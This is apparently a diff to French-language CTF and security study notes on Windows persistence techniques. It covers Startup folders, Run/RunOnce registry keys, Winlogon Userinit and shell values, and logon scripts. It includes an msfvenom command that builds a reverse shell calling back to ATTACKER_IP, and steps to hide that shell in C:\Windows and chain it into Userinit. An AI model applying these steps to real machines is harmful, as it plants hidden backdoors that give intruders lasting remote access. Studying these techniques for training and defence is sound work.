@@ -181,3 +181,77 @@ sc.exe stop/start TheService
 <br>
 <br>
 
+## Startup folder
+
+Tous les utilisateurs ont un répertoire sous
+```
+%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+```
+qui permet d'exécuter des programmes à chaque démarrage.
+<br>
+Si besoin que tous les utilisateurs d'un même poste exécute un script au démarrage
+```
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+```
+
+[Attaquant]
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
+```
+Transférer le fichier vers la machine victime (wget ou evil-winrm) Dans la destination choisie. Puis réouvrir une session avec le user.
+
+<br>
+<br>
+
+## Run / RunOnce
+
+```
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+```
+Placer le reverse shell dans un endroit sneaky ex: `C:\Windows`
+```
+move revshell.exe C:\Windows
+```
+Ensuite on créer un `REG_EXPAND_SZ` sous `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
+
+![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/a69e402c-7d25-4094-becb-d3bec41f289f)
+
+<br>
+<br>
+
+## Winlogon
+
+Point interressant pour de la persistence 
+```
+HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
+```
+
+`Userinit` pointe vers `userinit.exe` qui est en charge de restauré les préférences du profile.
+<br>
+`shell` qui pointe vers le shell du système qui est `explorer.exe`.
+
+![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/f61184aa-fe02-49a3-83e7-40bdedcbc800)
+
+même principe avec le reverseshell caché dans l'arborescence, on peut modifier la valeur de la clé de registre (exemple avec `Userinit`)
+```
+C:\Windows\system32\userinit.exe, C:\Windows\revshell.exe
+
+```
+![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/9801829f-531e-4404-a0c6-b41800d1dbf4)
+
+## Logon Scripts
+
+`userinit.exe`, lorsqu'il se charge va chercher une variable d'environnement appelée `UserInitLogonScript` la variable n'est pas mise par défaut.
+
+```
+HKCU\Environment
+```
+
+![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/bdd14b9e-0e55-4d12-918c-7ff6d8dfe29e)
+
+<br>
+<br>
